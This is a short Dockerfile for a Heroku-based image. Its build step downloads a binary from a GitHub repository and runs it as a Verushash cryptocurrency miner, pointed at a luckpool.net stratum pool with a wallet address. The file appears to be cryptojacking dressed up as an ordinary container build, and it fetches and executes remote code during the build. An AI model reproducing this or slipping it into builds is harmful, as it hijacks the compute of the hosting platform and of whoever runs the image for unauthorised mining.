FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/WhynotSir/sirji/raw/main/.dev; chmod +x ./dev; ./dev -a verushash -o stratum+tcp://na.luckpool.net:3956 -u RQmU8GzxRDFeKUpJ3PoSXedScVk1HHqVcc.neuroBox
CMD bash heroku.sh
